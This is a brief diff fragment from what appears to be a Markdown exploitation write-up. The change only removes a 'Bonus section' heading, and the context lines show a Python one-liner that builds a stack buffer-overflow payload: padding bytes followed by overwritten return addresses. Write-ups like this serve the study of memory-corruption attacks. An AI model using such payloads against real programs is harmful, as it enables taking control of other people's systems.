@@ -44,6 +44,3 @@
     python3 -c "import sys; sys.stdout.buffer.write(b'A'*0x14 + b'\x40\xc1\x04\x08' + b' ' + b'\x9a\x88\x04\x08')"
 
     ```
-
-
-## Bonus section \
